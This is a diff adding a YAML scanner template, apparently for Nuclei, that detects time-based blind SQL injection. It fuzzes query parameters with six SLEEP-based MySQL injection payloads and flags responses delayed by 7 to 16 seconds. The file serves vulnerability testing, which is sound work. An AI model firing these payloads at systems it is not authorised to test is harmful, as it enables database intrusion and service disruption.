@@ -1,0 +1,51 @@
+id: time-based-sqli
+
+info:
+  name: Time-Based Blind SQL Injection
+  author: 0xKayala
+  severity: critical
+  description: |
+    This Template detects time-based Blind SQL Injection vulnerability
+  tags: time-based-sqli,sqli,dast,blind
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration<=7"
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      injection:
+        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+        - "if(now()=sysdate(),SLEEP(7),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=7 && duration <=16"
+# digest: 4a0a004730450220221817cdddedb8336ddb4afc4476f70da46a0dfb726a703a5e748458ae5bef000221009ebe3675d3fd10bf29161c179bd9b317b01f18643c2f8a6731ed9d89569495cc:922c64590222798bb761d5b6d8e72950
